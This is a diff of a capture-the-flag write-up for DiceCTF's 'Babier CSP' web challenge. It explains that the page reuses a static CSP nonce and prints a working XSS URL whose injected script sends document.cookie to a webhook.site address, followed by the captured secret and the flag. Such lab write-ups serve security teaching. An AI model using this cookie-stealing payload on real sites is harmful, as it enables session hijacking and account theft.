@@ -1,4 +1,4 @@
-**[web/Babier CSP](https://babier-csp.dicec.tf/)**
+**[web/Babier CSP](https://babier-csp.dicec.tf/)**  
 We have source code index.js
 In line 8, it sets
 ```
@@ -12,13 +12,17 @@ This code just run 1 time, so NONCE doesn't change after run server, Ctrl+U we h
 ```
 +ZSveZwTAUqC6Pt9p+rgUg==
 ```
-We can XSS by using webhook.site
+We can host a server using webhook.site, redirect and get the cookie
 ```
 https://babier-csp.dicec.tf/?name=%3Cscript%20nonce=%2BZSveZwTAUqC6Pt9p%2BrgUg==%3Elocation.href=%22https://webhook.site/c23c6a4a-1ad6-420d-a488-033f8762e6ed/?data=%22%2Bdocument.cookie%3C/script%3E
 ```
 We got the secret
 ```
 secret=4b36b1b8e47f761263796b1defd80745
+```
+Go to https://babier-csp.dicec.tf/4b36b1b8e47f761263796b1defd80745/
+```
+dice{web_1s_a_stat3_0f_grac3_857720}
 ```
 **[web/Missing Flavortext](https://missing-flavortext.dicec.tf)**  
 We have source code index.js  
